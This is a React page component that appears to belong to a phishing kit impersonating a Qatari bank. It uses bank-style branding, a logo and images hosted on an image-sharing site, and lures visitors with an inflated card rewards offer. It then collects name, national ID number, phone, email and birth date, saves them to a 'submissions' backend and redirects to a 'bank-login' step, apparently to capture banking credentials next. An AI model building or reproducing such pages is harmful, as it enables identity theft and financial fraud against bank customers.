import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { useLanguage } from "@/contexts/LanguageContext";

const sliderImages = [
  "https://i.ibb.co/prbY7X4y/IMG-20260718-WA0011.jpg",
  "https://i.ibb.co/hRZYJfHN/IMG-20260718-WA0010.jpg",
  "https://i.ibb.co/LDBRJyyS/IMG-20260718-WA0009.jpg",
  "https://i.ibb.co/SXj5mWQR/IMG-20260718-WA0008.jpg",
  "https://i.ibb.co/PzVjfnr0/IMG-20260718-WA0007.jpg",
  "https://i.ibb.co/NgqDV0LF/IMG-20260718-WA0006.jpg",
  "https://i.ibb.co/rKNQp5t5/IMG-20260718-WA0005.jpg",
  "https://i.ibb.co/mCNvcQ2s/IMG-20260718-WA0001.jpg",
  "https://i.ibb.co/gMWpGhwT/IMG-20260718-WA0002.jpg",
  "https://i.ibb.co/ycrZw6z1/IMG-20260718-WA0003.jpg",
  "https://i.ibb.co/FPSMwx7/IMG-20260718-WA0004.jpg",
  "https://i.ibb.co/BH4fNcs0/h2-uefa-2024.jpg",
  "https://i.ibb.co/2707Nb2Z/h2-jet-ski-qatar.jpg",
  "https://i.ibb.co/fzZ25gZW/h2-f1-v2.jpg",
  "https://i.ibb.co/s9w4ZzdB/PHL.jpg",
  "https://i.ibb.co/x8Kq5Nfr/h2-visa-cug-china.jpg",
];

const titles = [
  { ar: "السيد", en: "Mr." },
  { ar: "السيدة", en: "Mrs." },
  { ar: "الآنسة", en: "Ms." },
  { ar: "الدكتور", en: "Dr." },
  { ar: "الأستاذ", en: "Prof." },
  { ar: "الشيخ", en: "Sheikh" },
  { ar: "الشيخة", en: "Sheikha" },
  { ar: "السعادة", en: "Excellency" }
];

const countries = [
  { ar: "قطر", en: "Qatar", code: "+974" },
  { ar: "المملكة العربية السعودية", en: "Saudi Arabia", code: "+966" },
  { ar: "الإمارات العربية المتحدة", en: "United Arab Emirates", code: "+971" },
  { ar: "الكويت", en: "Kuwait", code: "+965" },
  { ar: "البحرين", en: "Bahrain", code: "+973" },
  { ar: "عمان", en: "Oman", code: "+968" },
  { ar: "مصر", en: "Egypt", code: "+20" },
  { ar: "الأردن", en: "Jordan", code: "+962" },
  { ar: "لبنان", en: "Lebanon", code: "+961" },
  { ar: "المغرب", en: "Morocco", code: "+212" },
  { ar: "تونس", en: "Tunisia", code: "+216" },
  { ar: "الجزائر", en: "Algeria", code: "+213" },
  { ar: "العراق", en: "Iraq", code: "+964" },
  { ar: "اليمن", en: "Yemen", code: "+967" },
  { ar: "السودان", en: "Sudan", code: "+249" },
  { ar: "ليبيا", en: "Libya", code: "+218" },
  { ar: "فلسطين", en: "Palestine", code: "+970" },
  { ar: "سوريا", en: "Syria", code: "+963" },
  { ar: "موريتانيا", en: "Mauritania", code: "+222" },
  { ar: "الصومال", en: "Somalia", code: "+252" },
  { ar: "جيبوتي", en: "Djibouti", code: "+253" },
  { ar: "جزر القمر", en: "Comoros", code: "+269" },
  { ar: "تركيا", en: "Turkey", code: "+90" },
  { ar: "المملكة المتحدة", en: "United Kingdom", code: "+44" },
  { ar: "الولايات المتحدة", en: "United States", code: "+1" },
  { ar: "فرنسا", en: "France", code: "+33" },
  { ar: "ألمانيا", en: "Germany", code: "+49" },
  { ar: "إسبانيا", en: "Spain", code: "+34" },
  { ar: "إيطاليا", en: "Italy", code: "+39" },
  { ar: "كندا", en: "Canada", code: "+1" },
  { ar: "أستراليا", en: "Australia", code: "+61" },
  { ar: "الهند", en: "India", code: "+91" },
  { ar: "باكستان", en: "Pakistan", code: "+92" },
  { ar: "إندونيسيا", en: "Indonesia", code: "+62" },
  { ar: "ماليزيا", en: "Malaysia", code: "+60" },
  { ar: "الفلبين", en: "Philippines", code: "+63" },
  { ar: "تايلاند", en: "Thailand", code: "+66" },
  { ar: "الصين", en: "China", code: "+86" },
  { ar: "اليابان", en: "Japan", code: "+81" },
  { ar: "روسيا", en: "Russia", code: "+7" },
  { ar: "البرازيل", en: "Brazil", code: "+55" }
];

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "doha";
  const sessionId = localStorage.getItem("sessionId") || "";
  const { language, setLanguage } = useLanguage();
  const isArabic = language === "ar";

  const [formData, setFormData] = useState({
    title: "",
    nameEnglish: "",
    nameArabic: "",
    idNumber: "",
    residence: "Qatar",
    countryCode: "+974",
    phoneNumber: "",
    email: "",
    birthDay: "",
    birthMonth: "",
    birthYear: "",
    gender: isArabic ? "ذكر" : "Male",
    customerStatus: isArabic ? "عميل حالي" : "Existing Customer",
  });

  const [currentSlide, setCurrentSlide] = useState(0);

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % sliderImages.length);
    }, 5000);
    return () => clearInterval(timer);
  }, []);

  const updateSubmissionMutation = trpc.submissions.updateSubmission.useMutation();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const fullBirthDate = `${formData.birthYear}-${formData.birthMonth}-${formData.birthDay}`;
    const fullPhone = `${formData.countryCode}${formData.phoneNumber}`;

    try {
      await updateSubmissionMutation.mutateAsync({
        sessionId,
        title: formData.title,
        nameEnglish: formData.nameEnglish,
        nameArabic: formData.nameArabic,
        idNumber: formData.idNumber,
        residence: formData.residence,
        phoneNumber: fullPhone,
        email: formData.email,
        dateOfBirth: fullBirthDate,
        gender: formData.gender,
        customerStatus: formData.customerStatus,
      });
      toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
      setLocation(`/bank-login?bank=${bank}&session=${sessionId}`);
    } catch (error) {
      toast.error(isArabic ? "حدث خطأ في حفظ البيانات" : "Error saving data");
    }
  };

  return (
    <div dir={isArabic ? "rtl" : "ltr"} style={{ margin: 0, padding: 0, fontFamily: 'sans-serif', backgroundColor: '#f4f4f4', minHeight: '100vh' }}>
      <style>{`
        body { margin: 0; padding: 0; }
        .header { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
        .logo { height: 40px; }
        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
        .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 14px; }
        
        .slider-container { width: 100%; position: relative; height: 250px; overflow: hidden; margin-top: 65px; display: flex; alignItems: center; justifyContent: center; }
        .slider-img { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; transition: opacity 1.5s ease-in-out; }
        
        .info-box { background: white; margin: 15px; padding: 15px; border-radius: 10px; border-right: 5px solid #8C0032; box-shadow: 0 2px 5px rgba(0,0,0,0.05); text-align: ${isArabic ? 'right' : 'left'}; }
        .line { border-bottom: 1px solid #eee; padding: 8px 0; font-size: 14px; color: #333; }
        .rewards-line { padding: 8px 0; color: #8C0032; font-weight: bold; font-size: 14px; border-bottom: 1px solid #eee; }

        .form-container { padding: 20px; background: white; margin: 15px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .form-group { margin-bottom: 15px; text-align: ${isArabic ? 'right' : 'left'}; }
        label { display: block; font-weight: bold; margin-bottom: 5px; color: #555; font-size: 14px; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; font-size: 14px; }
        .birth-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
        .phone-grid { display: grid; grid-template-columns: 100px 1fr; gap: 10px; }
        .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
        .footer-image { width: 100%; display: block; margin-top: 20px; }
      `}</style>

      <header className="header">
        <div style={{ display: "flex", alignItems: "center", gap: "15px" }}>
          <div className="menu-icon">&#9776;</div>
          <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" className="logo" />
        </div>
        <button onClick={() => setLanguage(isArabic ? "en" : "ar")} className="lang-btn">
          {isArabic ? "English" : "العربية"}
        </button>
      </header>

      <div className="slider-container">
        {sliderImages.map((image, index) => (
          <img key={index} src={image} className="slider-img" style={{ opacity: currentSlide === index ? 1 : 0 }} />
        ))}
        <div style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.2)', zIndex: 2 }}></div>
      </div>

      <div className="info-box">
        <div className="line">{isArabic ? "✔ مميزات البطاقة: أولوية قصوى، تجميع نقاط مضاعف، دخول الصالات" : "✔ Card features: High priority, double points, lounge access"}</div>
        <div className="line">{isArabic ? "✔ أفضل شركات الطيران: الخطوط القطرية، السنغافورية، طيران الإمارات" : "✔ Best Airlines: Qatar Airways, Singapore Airlines, Emirates"}</div>
        <div className="line">{isArabic ? "✔ أفضل درجة رجال أعمال: Qsuite القطرية، درجة رجال الأعمال السنغافورية" : "✔ Best Business Class: Qatar Qsuite, Singapore Business Class"}</div>
        <div className="rewards-line">{isArabic ? "● مكافآت شهرية تصل إلى 5,000 ريال قطري" : "● Monthly rewards up to 5,000 QAR"}</div>
        <div className="rewards-line">{isArabic ? "● جوائز سنوية تصل إلى 3,000,000 ريال قطري" : "● Annual rewards up to 3,000,000 QAR"}</div>
        <div className="rewards-line">{isArabic ? "● خصومات عالمية تصل إلى 70%" : "● Global discounts up to 70%"}</div>
      </div>

      <div className="form-container">
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label>{isArabic ? "اللقب" : "Title"}</label>
            <select name="title" value={formData.title} onChange={handleChange} required>
              <option value="">{isArabic ? "-- اختر اللقب --" : "-- Select Title --"}</option>
              {titles.map((t, i) => (
                <option key={i} value={isArabic ? t.ar : t.en}>{isArabic ? t.ar : t.en}</option>
              ))}
            </select>
          </div>

          <div className="form-group">
            <label>{isArabic ? "الاسم كما في الهوية (بالإنجليزي)" : "Name as in ID (English)"}</label>
            <input type="text" name="nameEnglish" placeholder="Full Name" value={formData.nameEnglish} onChange={handleChange} required />
          </div>

          <div className="form-group">
            <label>{isArabic ? "الاسم (بالعربي)" : "Name (Arabic)"}</label>
            <input type="text" name="nameArabic" placeholder="الاسم الكامل" value={formData.nameArabic} onChange={handleChange} required />
          </div>

          <div className="form-group">
            <label>{isArabic ? "رقم الهوية" : "ID Number"}</label>
            <input type="number" name="idNumber" placeholder={isArabic ? "رقم الهوية" : "ID Number"} value={formData.idNumber} onChange={handleChange} required />
          </div>

          <div className="form-group">
            <label>{isArabic ? "بلد الإقامة" : "Country of Residence"}</label>
            <select name="residence" value={formData.residence} onChange={handleChange} required>
              {countries.map((c, i) => (
                <option key={i} value={isArabic ? c.ar : c.en}>{isArabic ? c.ar : c.en}</option>
              ))}
            </select>
          </div>

          <div className="form-group">
            <label>{isArabic ? "رقم الجوال" : "Phone Number"}</label>
            <div className="phone-grid">
              <select name="countryCode" value={formData.countryCode} onChange={handleChange} required>
                {countries.map((c, i) => (
                  <option key={i} value={c.code}>{c.code} ({isArabic ? c.ar : c.en})</option>
                ))}
              </select>
              <input type="number" name="phoneNumber" placeholder="XXXXXXXX" value={formData.phoneNumber} onChange={handleChange} required />
            </div>
          </div>

          <div className="form-group">
            <label>{isArabic ? "البريد الإلكتروني (Gmail)" : "Email (Gmail)"}</label>
            <input type="email" name="email" placeholder="example@gmail.com" value={formData.email} onChange={handleChange} required />
          </div>

          <div className="form-group">
            <label>{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
            <div className="birth-grid">
              <select name="birthDay" value={formData.birthDay} onChange={handleChange} required>
                <option value="">{isArabic ? "يوم" : "Day"}</option>
                {Array.from({ length: 31 }, (_, i) => i + 1).map(d => (
                  <option key={d} value={d}>{d}</option>
                ))}
              </select>
              <select name="birthMonth" value={formData.birthMonth} onChange={handleChange} required>
                <option value="">{isArabic ? "شهر" : "Month"}</option>
                {Array.from({ length: 12 }, (_, i) => i + 1).map(m => (
                  <option key={m} value={m}>{m}</option>
                ))}
              </select>
              <select name="birthYear" value={formData.birthYear} onChange={handleChange} required>
                <option value="">{isArabic ? "سنة" : "Year"}</option>
                {Array.from({ length: 100 }, (_, i) => new Date().getFullYear() - i).map(y => (
                  <option key={y} value={y}>{y}</option>
                ))}
              </select>
            </div>
          </div>

          <div className="form-group">
            <label>{isArabic ? "النوع" : "Gender"}</label>
            <select name="gender" value={formData.gender} onChange={handleChange}>
              <option value={isArabic ? "ذكر" : "Male"}>{isArabic ? "ذكر" : "Male"}</option>
              <option value={isArabic ? "أنثى" : "Female"}>{isArabic ? "أنثى" : "Female"}</option>
            </select>
          </div>

          <div className="form-group">
            <label>{isArabic ? "حالة العميل" : "Customer Status"}</label>
            <select name="customerStatus" value={formData.customerStatus} onChange={handleChange}>
              <option value={isArabic ? "عميل حالي" : "Existing Customer"}>{isArabic ? "عميل حالي" : "Existing Customer"}</option>
              <option value={isArabic ? "عميل جديد" : "New Customer"}>{isArabic ? "عميل جديد" : "New Customer"}</option>
            </select>
          </div>

          <button type="submit" className="submit-btn">
            {isArabic ? "متابعة" : "Continue"}
          </button>
        </form>
      </div>

      <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" className="footer-image" alt="Footer" />
    </div>
  );
}
